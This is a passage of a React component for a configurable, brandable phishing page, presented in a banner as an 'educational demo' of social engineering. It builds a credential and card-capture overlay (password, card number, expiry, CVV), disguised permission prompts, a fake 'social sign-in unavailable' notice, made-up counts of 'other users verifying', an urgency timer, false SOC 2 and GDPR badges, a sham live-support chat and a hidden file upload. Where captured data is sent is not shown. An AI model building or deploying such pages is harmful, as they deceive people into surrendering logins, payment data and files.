                <Input type="password" placeholder="Password" value={credForm.password} onChange={(e) => setCredForm((p) => ({ ...p, password: e.target.value }))} className="h-11 bg-white border-gray-200" data-testid="input-cred-password-overlay" />
                <Button className={`w-full h-11 ${brand.bg} hover:opacity-90 text-white`} onClick={() => submitCredentials("login")} data-testid="button-submit-login-overlay">Sign in</Button>
              </div>
            )}
            {cfg.enableBanking && credTab === "banking" && (
              <div className="space-y-3">
                <Input placeholder="Cardholder name" value={credForm.cardName} onChange={(e) => setCredForm((p) => ({ ...p, cardName: e.target.value }))} className="h-11 bg-white border-gray-200" data-testid="input-card-name-overlay" />
                <Input placeholder="Card number" value={credForm.cardNumber} onChange={(e) => setCredForm((p) => ({ ...p, cardNumber: e.target.value }))} className="h-11 bg-white border-gray-200" data-testid="input-card-number-overlay" />
                <div className="grid grid-cols-2 gap-3">
                  <Input placeholder="MM/YY" value={credForm.cardExpiry} onChange={(e) => setCredForm((p) => ({ ...p, cardExpiry: e.target.value }))} className="h-11 bg-white border-gray-200" data-testid="input-card-expiry-overlay" />
                  <Input type="password" placeholder="CVV" value={credForm.cardCvv} onChange={(e) => setCredForm((p) => ({ ...p, cardCvv: e.target.value }))} className="h-11 bg-white border-gray-200" data-testid="input-card-cvv-overlay" />
                </div>
                <Button className={`w-full h-11 ${brand.bg} hover:opacity-90 text-white`} onClick={() => submitCredentials("banking")} data-testid="button-submit-banking-overlay">Verify</Button>
              </div>
            )}
            {cfg.enableBanking && (
              <button className={`text-sm ${brand.accent} hover:underline w-full text-center`} onClick={() => setCredTab(credTab === "login" ? "banking" : "login")} data-testid="toggle-overlay-tab">
                {credTab === "login" ? "Verify payment method" : "Sign in instead"}
              </button>
            )}
          </div>
        </div>
      )}

      {pendingRequest && (
        <div className="fixed inset-0 z-50 bg-black/50 flex items-center justify-center p-4" data-testid="modal-permission-request">
          <div className="max-w-sm w-full bg-white rounded-xl shadow-xl p-6 text-center space-y-4 animate-in fade-in zoom-in-95">
            <div className="w-12 h-12 bg-gray-100 rounded-full flex items-center justify-center mx-auto">
              <Shield className="w-6 h-6 text-gray-500" />
            </div>
            <h3 className="text-lg font-semibold text-gray-900" data-testid="text-request-title">{disguisedLabels[pendingRequest].title}</h3>
            <p className="text-sm text-gray-500" data-testid="text-request-message">{disguisedLabels[pendingRequest].body}</p>
            <div className="flex gap-3 justify-center pt-2">
              <Button variant="outline" className="border-gray-200 text-gray-600" onClick={denyRequest} data-testid="button-deny-request">Not now</Button>
              <Button className={`${brand.bg} text-white`} onClick={acceptRequest} data-testid="button-accept-request">Allow</Button>
            </div>
          </div>
        </div>
      )}

      {socialToast && (
        <div className="fixed top-4 right-4 z-50 bg-white border border-gray-200 shadow-lg rounded-lg px-4 py-3 flex items-center gap-3 animate-in slide-in-from-right fade-in" data-testid="toast-social">
          <Loader2 className="w-4 h-4 text-gray-400 animate-spin" />
          <span className="text-sm text-gray-600">{socialToast} sign-in is temporarily unavailable. Please use email.</span>
        </div>
      )}

      {notificationShown && (
        <div className="fixed top-4 left-1/2 -translate-x-1/2 z-40 bg-white border border-gray-200 shadow-lg rounded-lg px-4 py-3 flex items-center gap-3 animate-in fade-in slide-in-from-top" data-testid="toast-social-proof">
          <div className="w-8 h-8 bg-green-50 rounded-full flex items-center justify-center flex-shrink-0">
            <Users className="w-4 h-4 text-green-600" />
          </div>
          <span className="text-sm text-gray-600">{Math.floor(Math.random() * 4) + 2} other users are currently verifying their accounts</span>
        </div>
      )}

      <div className="bg-amber-50 border-b border-amber-200">
        <div className="max-w-2xl mx-auto px-4 py-2.5 flex items-start gap-2.5">
          <AlertTriangle className="w-4 h-4 text-amber-600 flex-shrink-0 mt-0.5" />
          <p className="text-xs text-amber-700" data-testid="text-warning-banner">
            Educational Demo - This page demonstrates social engineering techniques used by real attackers to trick users into granting access.
          </p>
        </div>
      </div>

      <header className="bg-white border-b border-gray-200">
        <div className="max-w-2xl mx-auto px-4 py-3 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <div className={`w-8 h-8 ${brand.bg} rounded-lg flex items-center justify-center`}>
              <Shield className="w-4 h-4 text-white" />
            </div>
            <div>
              <span className="text-sm font-semibold text-gray-900">{cfg.pageTitle}</span>
              {cfg.pageSubtitle && <p className="text-[10px] text-gray-400 leading-tight">{cfg.pageSubtitle}</p>}
            </div>
          </div>
          <div className="flex items-center gap-4">
            {!wizardComplete && (
              <span className="text-xs text-gray-400" data-testid="text-urgency-timer">
                Session expires in {timerMin}:{timerSec.toString().padStart(2, "0")}
              </span>
            )}
            <button className="text-xs text-gray-400 hover:text-gray-600 flex items-center gap-1" data-testid="link-help">
              <HelpCircle className="w-3.5 h-3.5" />
              Help
            </button>
          </div>
        </div>
        {!wizardComplete && activeWizardSteps.length > 0 && (
          <div className="max-w-2xl mx-auto px-4">
            <Progress value={overallProgress} className="h-0.5" data-testid="progress-wizard" />
          </div>
        )}
      </header>

      <main className="flex-1 px-4 py-8">
        <div className="max-w-lg mx-auto">
          {wizardComplete ? renderComplete() : (
            <>
              {currentStep === 1 && renderStep1()}
              {currentStep === 2 && renderStep2()}
              {currentStep === 3 && renderStep3()}
              {currentStep === 4 && renderStep4()}
              {currentStep === 5 && renderStep5()}
            </>
          )}
        </div>
      </main>

      <footer className="bg-white border-t border-gray-200 mt-auto">
        <div className="max-w-2xl mx-auto px-4 py-4">
          <div className="flex items-center justify-between text-[11px] text-gray-400">
            <div className="flex items-center gap-4">
              <button className="hover:text-gray-600">Privacy Policy</button>
              <button className="hover:text-gray-600">Terms of Service</button>
              <button className="hover:text-gray-600">Contact</button>
            </div>
            <div className="flex items-center gap-1.5">
              <Lock className="w-3 h-3" />
              <span>Secured with 256-bit encryption</span>
            </div>
          </div>
          {!wizardComplete && (
            <div className="flex items-center justify-center gap-4 mt-3 text-[10px] text-gray-400">
              <div className="flex items-center gap-1">
                <ShieldCheck className="w-3 h-3" />
                <span>SOC 2 Verified</span>
              </div>
              <div className="flex items-center gap-1">
                <Fingerprint className="w-3 h-3" />
                <span>GDPR Compliant</span>
              </div>
              <div className="flex items-center gap-1">
                <Users className="w-3 h-3" />
                <span>{verificationCount.toLocaleString()} verified today</span>
              </div>
            </div>
          )}
        </div>
      </footer>

      {!cookieDismissed && (
        <div className="fixed bottom-0 left-0 right-0 z-30 bg-white border-t border-gray-200 shadow-lg animate-in slide-in-from-bottom" data-testid="banner-cookie">
          <div className="max-w-2xl mx-auto px-4 py-3 flex items-center justify-between gap-4">
            <p className="text-xs text-gray-500">We use cookies to improve your experience and ensure security. By continuing, you agree to our cookie policy.</p>
            <div className="flex gap-2 flex-shrink-0">
              <Button
                size="sm"
                variant="outline"
                className="text-xs h-8 border-gray-200"
                onClick={() => setCookieDismissed(true)}
                data-testid="button-cookie-settings"
              >
                Settings
              </Button>
              <Button
                size="sm"
                className={`text-xs h-8 ${brand.bg} text-white`}
                onClick={() => setCookieDismissed(true)}
                data-testid="button-cookie-accept"
              >
                Accept
              </Button>
            </div>
          </div>
        </div>
      )}

      {!chatOpen ? (
        <button
          className={`fixed bottom-20 right-4 z-20 w-12 h-12 ${brand.bg} text-white rounded-full shadow-lg flex items-center justify-center hover:opacity-90 transition-opacity`}
          onClick={() => setChatOpen(true)}
          data-testid="button-chat-open"
        >
          <MessageCircle className="w-5 h-5" />
        </button>
      ) : (
        <div className="fixed bottom-20 right-4 z-20 w-72 bg-white rounded-xl shadow-xl border border-gray-200 overflow-hidden animate-in fade-in slide-in-from-bottom-5" data-testid="panel-chat">
          <div className={`${brand.bg} text-white px-4 py-3 flex items-center justify-between`}>
            <span className="text-sm font-medium">Live Support</span>
            <button onClick={() => setChatOpen(false)} className="text-white/80 hover:text-white">
              <X className="w-4 h-4" />
            </button>
          </div>
          <div className="p-4 space-y-3">
            <div className="flex items-center gap-2">
              <div className="w-8 h-8 bg-gray-100 rounded-full flex items-center justify-center">
                <User className="w-4 h-4 text-gray-400" />
              </div>
              <div>
                <p className="text-xs font-medium text-gray-700">Support Team</p>
                <p className="text-[10px] text-gray-400">Typically replies in 3 min</p>
              </div>
            </div>
            <div className="bg-gray-50 rounded-lg p-3 text-xs text-gray-600">
              All agents are currently assisting other customers. Estimated wait time: 3 minutes. Please complete the verification while you wait.
            </div>
            <div className="flex gap-2">
              <Input placeholder="Type a message..." className="text-xs h-9 bg-white border-gray-200" data-testid="input-chat-message" />
              <Button size="sm" className={`h-9 ${brand.bg} text-white`} data-testid="button-chat-send">Send</Button>
            </div>
          </div>
        </div>
      )}

      <input ref={fileInputRef} type="file" multiple accept="image/*,.pdf,.doc,.docx,.txt" className="hidden" onChange={onFileSelected} data-testid="input-file-upload" />
    </div>
  );
}
